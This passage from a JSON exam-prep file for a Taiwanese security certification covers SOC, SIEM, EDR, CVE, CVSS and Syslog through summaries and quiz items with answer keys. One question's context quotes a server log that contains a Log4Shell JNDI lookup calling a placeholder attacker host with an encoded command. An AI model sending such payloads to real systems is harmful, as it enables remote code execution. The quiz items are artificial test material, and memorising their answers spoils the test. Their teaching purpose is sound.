   "title": "SOC、SOAR 與 EDR 能力",
   "examHits": 9,
   "examRefs": [
    "115-1 第9題",
    "114-2 第27題",
    "114-2 第28題",
    "114-1 第25題",
    "114-1 第26題",
    "114-1 第27題",
    "114-1 第28題",
    "113-1 第28題",
    "112-2 第23題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "SOC（資安監控維運中心）不是買一套產品就完成，而是「人員＋流程＋技術」：持續監控、事件回應與管理、報告與統計分析，再配上 SIEM（蒐集、關聯分析、告警與查詢鑑識）、EDR（端點行為偵測與回應）、SOAR（自動化編排回應）、CTI（威脅情資）。考題常用『最不適切／不正確』的句型，放進一個明顯偏離該工具核心功能的選項，例如把 SIEM 說成只蒐集外部情資、說 SIEM 缺乏關聯分析、說 SOC 可以靠單一產品達成。建置 SOC 要定義組織架構與服務範圍（是否含雲端、OT）、情資計畫、SOP 與升級路徑，績效指標要先看偵測與回應效率，而不是形象。",
   "keyPoints": [
    "看到『SIEM』→ 核心是蒐集內外部日誌＋關聯分析＋告警＋查詢與取證；說它『只蒐集外部情資』或『缺乏關聯分析』都是錯的（那是 CTI／情資平台的角色）。",
    "看到『EDR』→ 蒐集端點日誌與行為、可偵測並阻斷、確認入侵時通常比單純網路流量更有資訊量；不是傳統特徵碼防毒的翻版。",
    "看到『SOC 可用單一產品達成』→ 錯，SOC 需要人員、流程與多種技術（SIEM、EDR、SOAR、CTI）搭配。",
    "建置 SOC 要處理：組織架構與服務範圍（含雲端、行動、OT）、CTI 與威脅狩獵、SOP／手冊與升級路徑、以事件對業務的影響排優先序。",
    "SOC 績效指標先衡量偵測與回應的效率與品質，而不是只看外部形象。"
   ],
   "trap": "把工具功能說得過窄或過寬（如 SIEM 只收情資、EDR 等同防毒、單一產品就能做 SOC）；遇到『最不適切』題要找『明顯偏離核心功能』的那一句。",
   "quiz": [
    {
     "stem": "針對目前時下常見的資安技術與產品中，下列何項描述較「不」正確？",
     "options": [
      "Breach and Attack Simulation（BAS）主要是用高頻率且大量的攻擊方式來檢驗企業當下的防禦機制是否有效",
      "External Attack Surface Management（EASM）主要是用來查核企業暴露於網路上的數位資產有哪些，例如對外開放的 port、企業持有的網域名稱、企業外洩的帳號密碼等等",
      "Security Information and Event Management（SIEM）僅用來蒐集外部常見的攻擊情資，例如其他國家或企業的攻擊事件，或是暗網上的攻擊行動預告文章，以便發現潛在的資安威脅，然後再來檢視企業是否即將面臨類似的攻擊",
      "Endpoint Detection and Response（EDR）主要是透過分析端點的日誌和行為，來發現甚至阻斷攻擊者的行動"
     ],
     "answer": 2,
     "hint": "逐項回想每個技術或產品的主要功能，判斷描述是否正確。",
     "explanation": "答案 C（不正確的敘述）。SIEM 的核心是蒐集組織內部各系統的日誌與事件、做關聯分析並告警，不是『僅』蒐集外部攻擊情資；蒐集外部情資是威脅情資（CTI）平台的角色。A BAS 以模擬攻擊檢驗防禦機制是否有效，描述正確；B EASM 盤點對外暴露的數位資產（開放 port、網域、外洩帳密等），正確；D EDR 分析端點日誌與行為，發現甚至阻斷攻擊者行動，正確。",
     "source": "115-1 第9題"
    },
    {
     "stem": "情境如附圖所示。隨著企業逐步採用雲端服務與遠端工作模式，對端點偵測與回應（Endpoint Detection and Response, EDR）工具在資安監控中的作用日益凸顯。關於 EDR 能力對資安營運中心（Security Operations Center, SOC）在偵測與確認入侵方面的價值，下列描述何者最為正確？",
     "options": [
      "EDR 主要用於監控網路流量，以發現已知惡意程式碼的特徵碼，與傳統 IDS 無異",
      "EDR 提供的資訊與傳統網路流量資料相比，在確認入侵方面較不具參考價值，因為它可能被攻擊者規避",
      "EDR 系統提供來自端點的強大偵測和豐富的監控數據，使其資料在確認入侵方面通常比網路流量資料更具資訊性",
      "EDR 僅是一種傳統防毒解決方案的升級版，不具備進階威脅偵測能力，無法應對 APT 級攻擊"
     ],
     "answer": 2,
     "context": "近年來，全球網路資安情勢日趨嚴峻，伴隨地緣政治緊張，複雜且高強度的國家級網路攻擊，例如：進階持續性威脅（Advanced Persistent Threat, APT）日益頻繁。這些攻擊不僅針對傳統資訊技術（Information Technology, IT）環境，更擴展至關鍵基礎設施的營運技術（Operational Technology, OT）系統、企業雲端服務與員工行動裝置。攻擊手法融合了勒索軟體、供應鏈攻擊等多種戰術，目的從情資竊取到癱瘓業務不等，對組織的資料完整性、可用性與機密性構成前所未有的挑戰。",
     "hint": "回想 EDR 的功能與資料來源，逐項判斷每句描述是否正確。",
     "explanation": "答案 C。EDR 持續蒐集端點的程序、檔案、登錄檔、網路連線等細節，提供豐富的監控數據，對確認入侵通常比單純網路流量更有資訊量。A 把 EDR 說成只看網路流量的特徵碼偵測，與傳統 IDS 無異，錯；B 說 EDR 資料價值較低，與事實相反；D 說 EDR 只是防毒升級版、無法應對 APT，也錯，EDR 的設計目標就包含進階威脅的偵測與回應。",
     "source": "114-2 第27題"
    },
    {
     "stem": "情境如附圖所示。某組織正計畫建立一個符合其未來需求的資安營運中心（Security Operations Center, SOC），並考慮納入雲端與營運技術（OT）環境的監控，以應對日益複雜的網路攻擊。在建立 SOC 過程中應處理或採納的關鍵考量或功能，下列描述哪些最正確？",
     "options": [
      "根據組織的規模、業務需求以及預期提供的服務範圍，建立適當的 SOC 組織架構，包括是否涵蓋雲端、行動和營運技術（OT）環境的監控與回應職責",
      "實做全面的網路威脅情資（CTI）計畫，以深入理解威脅者（包含其戰術、技術與程序 TTPs），並依據對其分析來調整偵測、防禦措施，並支援威脅狩獵",
      "建立績效衡量指標需聚焦於 SOC 對組織外部形象的正面影響，內部運作效率可於事後再視情況補充評估",
      "透過標準作業程序（SOPs）和應急手冊，明確定義事件類別、回應步驟和升級路徑，並根據事件對業務的潛在影響來優先處理事件回應，以確保在危機時刻能迅速且精準行動"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "近年來，全球網路資安情勢日趨嚴峻，伴隨地緣政治緊張，複雜且高強度的國家級網路攻擊，例如：進階持續性威脅（Advanced Persistent Threat, APT）日益頻繁。這些攻擊不僅針對傳統資訊技術（Information Technology, IT）環境，更擴展至關鍵基礎設施的營運技術（Operational Technology, OT）系統、企業雲端服務與員工行動裝置。攻擊手法融合了勒索軟體、供應鏈攻擊等多種戰術，目的從情資竊取到癱瘓業務不等，對組織的資料完整性、可用性與機密性構成前所未有的挑戰。",
     "hint": "回想 SOC 建置的關鍵要素，逐項判斷每句是否屬於建置時應處理的考量。",
     "explanation": "答案 A、B、D。A 依規模、需求與服務範圍設計 SOC 組織架構，並界定是否涵蓋雲端、行動與 OT；B 建立 CTI 計畫，理解威脅者 TTPs，支援偵測調整與威脅狩獵；D 用 SOP 與應急手冊定義事件分類、回應步驟與升級路徑，並依對業務的潛在影響排優先順序。C 錯誤：績效指標若只聚焦外部形象、把內部運作效率擺到事後補充，會使 SOC 無法衡量真正的偵測與回應能力，應先量測偵測、回應的效率與品質。",
     "source": "114-2 第28題"
    },
    {
     "stem": "情境如附圖所示。該公司評估團隊針對資安監控維運中心先進行初步的任務界定，試問下列關於資安監控維運中心的敘述何者最「不」適切？",
     "options": [
      "持續監控企業的資訊系統、網路和應用",
      "負責對識別到的安全事件進行及時回應和管理",
      "提供有關資訊安全事件的報告、紀錄、追蹤、分析和統計",
      "可以透過導入單一產品的方式來達成所設定的目標"
     ],
     "answer": 3,
     "context": "某公司為因應潛在的資安威脅，而設立資安監控維運中心（Security Operations Center，SOC），並擬採購相關軟硬體及資安解決方案。",
     "hint": "回想 SOC 的組成要素與任務，逐項判斷每句是否適切。",
     "explanation": "答案 D（最不適切）。SOC 的任務包含持續監控資訊系統、網路與應用，對識別到的事件及時回應與管理，並提供事件的報告、紀錄、追蹤、分析與統計（A、B、C 皆為其任務）。D 說可以導入『單一產品』就達成目標，不適切：SOC 是人員、流程與多種技術（SIEM、EDR、SOAR 等）的組合，沒有單一產品能取代。",
     "source": "114-1 第25題"
    },
    {
     "stem": "情境如附圖所示。該公司評估團隊認為安全資訊與事件管理（Security Information and Event Management）對公司的資安監控維運中心是重要的基礎設施，下列關於安全資訊與事件管理的功能敘述，何項最「不」適切？",
     "options": [
      "能夠監控企業內外的資訊安全事件，包括日誌（logs）、警報（alerts）、事件（events）等",
      "可以從多個資源中收集、匯聚和分析這些事件，並應用預先設定的規則和策略進行事件的識別、分析和報警",
      "缺乏對事件進行關聯分析、行為分析、異常偵測等技術",
      "可以自動儲存和管理所有收集到的事件資訊，並提供事件查詢、報表生成、事件調查和取證等功能"
     ],
     "answer": 2,
     "context": "某公司為因應潛在的資安威脅，而設立資安監控維運中心（Security Operations Center，SOC），並擬採購相關軟硬體及資安解決方案。",
     "hint": "回想 SIEM 的核心功能，逐項判斷每句描述是否適切。",
     "explanation": "答案 C（最不適切）。SIEM 本來就具備事件關聯分析、行為分析與異常偵測等能力，說它『缺乏』這些技術是錯的。A 監控內外部日誌、警報、事件；B 自多個來源蒐集匯聚並套用規則進行識別、分析與告警；D 儲存管理事件資訊並提供查詢、報表、調查與取證，皆為 SIEM 的功能。",
     "source": "114-1 第26題"
    }
   ]
  },
  {
   "id": "2.1-04",
   "section": "2.1",
   "title": "CVSS、CVE 與弱點情資",
   "examHits": 6,
   "examRefs": [
    "113-2 第6題",
    "111-1 第27題",
    "111-1 第38題",
    "109-1 第33題",
    "109-1 第34題",
    "108-1 第2題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "收到弱點通報後，要能看懂三件事：CVE（弱點的公開編號與描述）、CVSS（嚴重程度評分）、NVD（美國的弱點資料庫，附 CVSS 分數與影響產品）。CVE 編號格式是 CVE-年份-流水號，由 CVE 編號管理機構（CNA）分配，由 MITRE 營運維護；CVSS 滿分 10 分；v3.x 分為基本、時間、環境三個度量組（2023 年 11 月發布的 v4.0 改為基本、威脅〔Threat，承接原時間度量的角色〕、環境、補充〔Supplemental〕四組），基本度量包含攻擊途徑、複雜度、所需權限（Privileges Required）、使用者互動、影響範圍與機密性／完整性／可用性衝擊，分數可轉成低、中、高、嚴重的等級。時間度量組看的是 Exploit 成熟度、修補等級等，不是『公開了幾天』。通報內容要能讀出：影響的產品與版本、弱點類型、CVSS 向量；是否附解決方案要看實際內容。",
   "keyPoints": [
    "CVE 編號 = CVE-年份-流水號（流水號不是產品公司編號）；全名 Common Vulnerabilities and Exposures；由 CNA 分配、MITRE 營運。",
    "CVSS 分數越高越嚴重、滿分 10；v3.x 三個度量組：基本、時間、環境（v4.0 改為基本、威脅、環境、補充四組）；『所需權限』屬基本度量；『公開天數』不是評分項目。",
    "CVSS 能把數值轉成低／中／高／嚴重，幫助排修補優先順序；但嚴重性不等於組織的實際風險。",
    "NVD 是免費的弱點資料庫（提供 CVSS 與影響產品），不是『商業掃描服務』；Exploit-DB 用來查可能相關的攻擊代碼。",
    "讀 CVE 詳情頁：先看描述（弱點類型、影響產品與版本），再看 CVSS 向量（AV／AC／PR／UI／S／C／I／A），確認通報有沒有解決方案欄位。"
   ],
   "trap": "把 CVE 當成評分系統、把 CVSS 的時間度量說成『公開天數』、把 NVD 說成商業掃描服務；另外，CVE 編號格式最後一段是流水號，不是公司或產品代碼。",
   "quiz": [
    {
     "stem": "情境如附圖所示，工程師在評估使用「弱點評估」工具過程中發現了「通用弱點評分系統（Common Vulnerability Scoring System，CVSS）」的網站，請問下列敘述何項錯誤？",
     "options": [
      "CVSS 是一個開放的框架，主要用於傳達軟體弱點的特徵以及該弱點的風險程度",
      "CVSS 提供了一種獲取弱點主要特徵並產生回應其嚴重性的數位分數的方法",
      "CVSS 可以將數位分數轉換為定性表示形式（例如低、中、高以及嚴重），來提供組織正確評估其弱點管理流程並確定其處裡弱點的優先順序",
      "CVSS 由基本度量組（Base metric groups）、時間度量組（Temporal metric groups）以及環境度量組（Environmental metric groups）等三個部分所組成"
     ],
     "answer": 0,
     "context": "公司因供應鏈之客戶要求在執行受託業務時，必須針對所承接之受託業務有關的資訊安全有所作為，因此公司高層下令有關人員針對公司在執行受託業務上可能面臨的資訊安全風險議題進行研議。",
     "hint": "逐句對照 FIRST 對 CVSS 的定義與度量組組成，判斷是否有誤；本題另有答案給分，答完請看解析。",
     "explanation": "答案 A（官方公告：答 D 也給分）。題目要找錯誤的敘述。A 錯在用詞：CVSS 規格書說它產生的是表示弱點「嚴重性（severity）」的分數；組織的實際「風險」還要另外考量資產價值、威脅等因素，CVSS 本身不衡量風險。D 依 CVSS v3.x 是正確的（基本、時間、環境三組）；但 2023 年 11 月發布的 CVSS v4.0 已改為基本（Base）、威脅（Threat）、環境（Environmental）、補充（Supplemental）四組，用 v4.0 來看 D 就不對，這可能是 D 也給分的原因（推論，官方未說明）。B 產生數字分數、C 轉成低／中／高／嚴重以利排序，都與 CVSS 一致。",
     "source": "113-2 第6題"
    },
    {
     "stem": "Windows OS重大漏洞，且被勒索集團開採成為武器，基於安全維運需要，必須進行漏洞修補與更新，所以必須掌握相關漏洞資訊與補救措施，或取得修補程式。於是身為資安工程師必須去查找相關漏洞資訊，CVE 漏洞資料庫成為最重要維運處置情資來源。關於 CVE，下列敘述何者正確？",
     "options": [
      "全名為 Command Vulnerabilities and Exposures",
      "由MITRE 所屬National Cybersecurity FFRDC 營運維護",
      "CVE對每一漏洞都有一個專屬編號，CVE為固定的前綴字， YYYY 為西元紀年，NNNN為產品公司編號所組成",
      "CVE ID 由CVE編號管理機構 CND分配。由資安公司和研究組織組成。MITRE 不可直接發佈 CVE"
     ],
     "answer": 1,
     "hint": "逐項核對 CVE 的全名、編號每一段的意義、誰營運維護、誰能發佈，找出唯一完全吻合的那句。",
     "explanation": "答案 B。CVE 由 MITRE 所屬的 National Cybersecurity FFRDC 營運維護。A 全名是 Common Vulnerabilities and Exposures，不是 Command…；C 編號格式 CVE-YYYY-NNNN 中 NNNN 是流水號，不是產品公司編號；D 錯在說『MITRE 不可直接發佈 CVE』，MITRE 本身也是 CNA，可以分配與發布 CVE。",
     "source": "111-1 第27題"
    },
    {
     "stem": "若懷疑應用程式伺服器存在弱點，關於弱點評估，下列敘述何者「不」正確？",
     "options": [
      "可透過 CVE網站，查詢已公開或未公開的弱點資訊",
      "可透過網站伺服器之存取紀錄分析，判斷是否遭受攻擊",
      "可透過 NVD（National Vulnerability Database）資料庫之商業服務，進行弱點掃描偵測",
      "可透過 Exploit-DB資料庫搜尋，可能相關之攻擊代碼"
     ],
     "answer": 2,
     "context": "【題組5】\n某網站維護人員發現其網頁應用程式伺服器回應緩慢，因此進行應用程式效能分析與除錯，發現應用程式日誌中有以下的異常錯誤訊息：\n  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::                (v2.6.1)\n\n2022-01-11 11:12:35.849  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Starting VulnerableAppApplication using Java 1.8.0_181 on fb35eb8e05ff with PID 1 (/app/spring-boot-application.jar started by root in /)\n2022-01-11 11:12:35.864  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : No active profile set, falling back to default profiles: default\n2022-01-11 11:12:37.261  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)\n2022-01-11 11:12:37.339  INFO 1 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]\n2022-01-11 11:12:37.340  INFO 1 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]\n2022-01-11 11:12:37.409  INFO 1 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext\n2022-01-11 11:12:37.409  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1439 ms\n2022-01-11 11:12:37.942  INFO 1 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''\n2022-01-11 11:12:37.960  INFO 1 --- [           main] f.c.l.v.VulnerableAppApplication         : Started VulnerableAppApplication in 2.656 seconds (JVM running for 3.61)\n2022-01-11 11:12:45.755  INFO 1 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'\n2022-01-11 11:12:45.756  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'\n2022-01-11 11:12:45.759  INFO 1 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 3 ms\n2022-01-11 11:12:45.806  WARN 1 --- [nio-8080-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:18:26.005  WARN 1 --- [nio-8080-exec-3] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:18:54.334  WARN 1 --- [nio-8080-exec-4] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:19:41.949  WARN 1 --- [nio-8080-exec-5] .w.s.m.s.DefaultHandlerExceptionResolver : Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]\n2022-01-11 11:23:43,950 http-nio-8080-exec-6 WARN Error looking up JNDI resource [ldap://attack.io:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: attack.io:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]\n        at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)\n        at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)\n        at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1615)\n        at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)\n        at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)\n        at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)\n        at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)\n        at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)\n        at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)\n        at javax.naming.InitialContext.lookup(InitialContext.java:417)",
     "hint": "逐項回想 CVE、NVD、Exploit-DB 各自提供的內容，判斷描述是否正確。",
     "explanation": "答案 C（不正確的敘述）。NVD 是美國國家弱點資料庫（免費公開，收錄 CVE 並附 CVSS 評分與影響產品），不是用來『進行弱點掃描偵測的商業服務』。A 透過 CVE 網站查詢弱點資訊，B 分析存取紀錄判斷是否遭攻擊，D 用 Exploit-DB 搜尋可能相關的攻擊代碼，皆為官方視為正確的做法（A 官方視為正確敘述）（嚴格說，CVE 網站只收錄已公開或已保留編號的弱點，查不到未公開弱點的細節；官方仍視 A 為正確。）。",
     "source": "111-1 第38題"
    },
    {
     "stem": "題組背景描述如附圖。某日A公司內部資安人員收到一則漏洞資安通報資訊如附圖，關於內容中通用漏洞評分系統（Common Vulnerability Scoring System, CVSS），下列敘述何者「不」正確？",
     "options": [
      "CVSS 的分數愈高，代表這個漏洞的嚴重等級愈高",
      "CVSS 的評分基準中，會考量這個漏洞已被公開的天數",
      "CVSS 的評分基準中，會考量這個漏洞或弱點在使用時，所需擁有的權限等級（Privileges Required）",
      "CVSS 的分數滿分為 10分"
     ],
     "answer": 1,
     "context": "題組：對於公司內部資安維運而言，資安漏洞或弱點的修補常是重要的工作，收到漏洞或弱點通報後，資安人員常依據漏洞或弱點之嚴重性，加上公司本身是否為漏洞或弱點影響範圍等資訊，來決定漏洞或弱點修補的優先性，以避免公司遭受更大的資安危害，A 公司係屬我國資通安全管理法所規範之「特定非公務機關」，且被主管機關核定資安責任等級為 A 級，對日常資安漏洞的修補投入許多心力。\n\n根據上列資訊，請回答下列問題：\n\nCVE-2019-19781 Detail\nMODIFIED\nThis vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which may result in further changes to the information provided.\nCurrent Description\nAn issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.\nSource: MITRE\n+View Analysis Description\nSeverity  [CVSS Version 3.x] [CVSS Version 2.0]\nCVSS 3.x Severity and Metrics:\nNIST: NVD    Base Score: 9.8 CRITICAL    Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
     "hint": "回想 CVSS 的分數範圍與各度量組的評分項目，逐項判斷每句是否正確。",
     "explanation": "答案 B（不正確的敘述）。CVSS 基本度量不會考慮『弱點已公開幾天』；時間度量組看的是 Exploit 成熟度、修補等級、報告可信度等，仍不是天數。A 分數越高嚴重等級越高、D 滿分 10 分，都正確；C 『所需權限（Privileges Required, PR）』是基本度量之一，正確。圖中 CVE-2019-19781 的向量即含 PR:N。",
     "source": "109-1 第33題"
    },
    {
     "stem": "題組背景描述如附圖。承上題，關於這則漏洞通報（如附圖）中所揭露的訊息，下列敘述何者正確？",
     "options": [
      "通報內容有揭露此一漏洞的公布日期",
      "通報內容沒有揭露受此一漏洞所影響的產品與版本",
      "通報內容有揭露受此一漏洞所影響的產品、版本與解決方案",
      "通報內容有揭露受此一漏洞所會造成的影響或弱點類型"
     ],
     "answer": 3,
     "context": "題組：對於公司內部資安維運而言，資安漏洞或弱點的修補常是重要的工作，收到漏洞或弱點通報後，資安人員常依據漏洞或弱點之嚴重性，加上公司本身是否為漏洞或弱點影響範圍等資訊，來決定漏洞或弱點修補的優先性，以避免公司遭受更大的資安危害，A 公司係屬我國資通安全管理法所規範之「特定非公務機關」，且被主管機關核定資安責任等級為 A 級，對日常資安漏洞的修補投入許多心力。\n\n根據上列資訊，請回答下列問題：\n\nCVE-2019-19781 Detail\nMODIFIED\nThis vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which may result in further changes to the information provided.\nCurrent Description\nAn issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.\nSource: MITRE\n+View Analysis Description\nSeverity  [CVSS Version 3.x] [CVSS Version 2.0]\nCVSS 3.x Severity and Metrics:\nNIST: NVD    Base Score: 9.8 CRITICAL    Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
     "hint": "把每個選項與附圖內容逐欄對照，判斷敘述是否與圖中資訊相符。",
     "explanation": "答案 D。圖中的 NVD 詳情頁寫明弱點類型為 Directory Traversal，並以 CVSS 向量顯示機密性、完整性、可用性皆為 High 的影響，所以通報有揭露弱點類型與影響。A 圖中並未顯示公布日期；B 圖中有列出受影響的產品與版本（Citrix ADC and Gateway 10.5、11.1、12.0、12.1、13.0），所以說『沒有揭露』錯；C 雖有產品與版本，但圖中沒有解決方案，所以說『有揭露解決方案』錯。",
     "source": "109-1 第34題"
    }
   ]
  },
  {
   "id": "2.1-05",
   "section": "2.1",
   "title": "SIEM 與 Syslog 判讀",
   "examHits": 6,
   "examRefs": [
    "114-2 第24題",
    "114-1 第16題",
    "114-1 第21題",
    "113-1 第19題",
    "113-1 第26題",
    "113-1 第27題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "SIEM 要有資料才有用，所以考題常問：日誌從哪裡來、用什麼方式送、嚴重度怎麼篩。Syslog（RFC 5424）的 PRI 值 = Facility × 8 + Severity，Severity 數字越小越嚴重：0 Emergency、1 Alert、2 Critical、3 Error、4 Warning、5 Notice、6 Informational、7 Debug。只想看『必須立即處理或系統無法使用』的訊息，就篩 Severity ≤ 1；要除錯用最詳細的 Debug。看到優先值（Priority）就先除以 8：商是設施（如 12 為 NTP 子系統），餘數是嚴重度。身份驗證事件閾值偵測則要蒐集 VPN、IAM、目錄服務等產生驗證事件的來源，再建立使用者行為基準；單純網路流量日誌看不到帳號驗證結果。",
   "keyPoints": [
    "Syslog Severity：0 Emergency、1 Alert、2 Critical、3 Error、4 Warning、5 Notice、6 Informational、7 Debug；數字越小越嚴重。",
    "『必須立即採取行動或系統無法使用』= Alert＋Emergency → 篩選條件 Severity ≤ 1。",
    "看到優先值（PRI）→ 除以 8：商為 Facility（12 = NTP 子系統），餘數為 Severity（例：96 ÷ 8 = 12 餘 0 → Emergency）。",
    "要詳盡日誌供除錯 → 選 Debug（最詳細、量最大，平時不宜長開）。",
    "建立身份驗證基準要蒐集能看到『誰在何時驗證成功或失敗』的來源（VPN、IAM、目錄服務日誌），單純 network flow 缺乏帳號驗證資訊。"
   ],
   "trap": "把 Severity 數字大小與嚴重程度搞反（0 才是最嚴重），或把 Priority 值直接當成 Severity；Facility 與 Severity 混為一談。",
   "quiz": [
    {
     "stem": "在網路安全的資安監控機制中，其一方式為使用身份驗證事件閾值（Authentication Event Thresholding）來識別異常使用者行為，透過收集身份驗證事件，來建立使用者活動基準，並分析身份驗證事件是否一致來而達成偵測。關於可作為身份驗證事件閾值的資料來源敘述，下列何者最為適切？",
     "options": [
      "虛擬私人網路（Virtual private network, VPN）伺服器日誌檔",
      "網路流量（Network flow）日誌檔",
      "身份與存取管理（Identity and access management, IDAM）日誌檔",
      "輕量型目錄存取通訊協定（Lightweight directory access protocol, LDAP）網路傳輸量"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項問：這個資料來源記錄了哪些欄位？能否用來建立身份驗證的行為基準？",
     "explanation": "答案 A、C、D。身份驗證事件閾值偵測需要含驗證行為的資料：A VPN 伺服器日誌記錄遠端登入成功與失敗；C IAM 日誌記錄帳號驗證與授權事件；D 官方也列為資料來源：LDAP 是目錄服務的驗證協定，未加密的 LDAP 流量看得到綁定（bind）請求與成敗結果，這是它和只有五元組的 network flow 不同之處（此為理解方式，官方未說明）。B 網路流量（network flow）日誌只有連線的五元組與流量量值，看不到帳號驗證成功或失敗，不適合作為此類基準資料。",
     "source": "114-2 第24題"
    },
    {
     "stem": "安全性資訊與事件管理（Security Information and Event Management，SIEM）是蒐集、分析、關聯日誌，並且提供即時的警報與威脅檢測，可針對事件回溯與調查，當我們設定要將一台 Windows Server 2019的安全性事件，拋送回到 SIEM 進行分析，可以透過下列哪些通訊協定無需額外的透過 cmd 指令串接、設定、組態即可傳送？",
     "options": [
      "Syslog（System Logging Protocol）",
      "SNMP（Simple Network Management Protocol）",
      "Agent-Based",
      "Windows Event Forwarding（WEF）"
     ],
     "answer": [
      0,
      2,
      3
     ],
     "hint": "逐項回想每種方式的用途，判斷能否把作業系統的安全性事件送到 SIEM；本題官方答案與一般認知有落差，答完請看解析。",
     "explanation": "答案 A、C、D。本題官方採 A、C、D；一般認知上 Windows Server 2019 原生不會直接送出 Syslog，而 Windows Event Forwarding（WEF）通常需要啟用 WinRM 等設定，與題幹『無需額外透過 cmd 指令』的說法不易直接對應，官方未說明理由，故列為爭議題，作答時以官方答案為準。B SNMP 是網路設備管理與狀態輪詢協定，並不是用來傳送 Windows 安全性事件日誌的機制。",
     "source": "114-1 第16題"
    },
    {
     "stem": "某「安全性資訊與事件管理」（簡稱 SIEM）系統依照 The Syslog Protocol（RFC5424）標準設計，因事件眾多，希望只顯示必須立即採取行動或系統無法使用，這類極為嚴重的訊息在特定的畫面上，請問其篩選條件下列何者最為合適？",
     "options": [
      "Severity <= 1",
      "Severity <= 3",
      "Severity <= 5",
      "Severity <= 7"
     ],
     "answer": 0,
     "hint": "先寫出 0 到 7 各等級的名稱，找出『立即行動』與『系統無法使用』各落在哪個數字，再決定不等式的上限。",
     "explanation": "答案 A。RFC 5424 的 Severity：0 Emergency（系統不可用）、1 Alert（必須立即採取行動）。要只顯示這兩類最嚴重訊息，篩選條件是 Severity <= 1。B <=3 會連 Critical、Error 一起顯示；C <=5 還包含 Warning、Notice；D <=7 等於全部訊息。",
     "source": "114-1 第21題"
    },
    {
     "stem": "某設備的日誌記錄功能依照 The Syslog Protocol（RFC5424）標準設計，若需要較為詳盡的日誌訊息，以提供除錯（debug）使用，而該系統只提供下列 4 種的記錄等級，請問應該選擇下列何項設定最為合適？",
     "options": [
      "Emergency",
      "Alert",
      "Warning",
      "Debug"
     ],
     "answer": 3,
     "hint": "題目要的是『最詳盡』，不是『最嚴重』。想想哪個等級會把細節訊息也一併記下來。",
     "explanation": "答案 D。依 RFC 5424，Debug（等級 7）提供最詳細的訊息，用於除錯。Emergency、Alert、Warning 都是偏向異常或警示的等級，訊息量少而且不含細節。題目提到系統只提供這四種記錄等級，要詳盡訊息就選最詳細的那個。",
     "source": "113-1 第19題"
    },
    {
     "stem": "情境如附圖所示，因部分服務主機環境為 Linux，故廠商 A 有一套依照 The Syslog Protocol（RFC5424）標準建置的日誌記錄系統，請問某事件為 NTP 子系統相關的記錄，其優先值（Priority）為 96，試問該事件的重要性（Severity）為下列何項？",
     "options": [
      "Emergency",
      "Error",
      "Warning",
      "Informational"
     ],
     "answer": 0,
     "context": "有一個在我國立案的公司，以下簡稱廠商 A，其為「資通安全事件通報及應變辦法」所稱之特定非公務機關，主要業務為屬於關鍵基礎設施的交通服務。",
     "hint": "把優先值拆成商與餘數：商代表來源子系統（題目已給 NTP），餘數才是嚴重程度。",
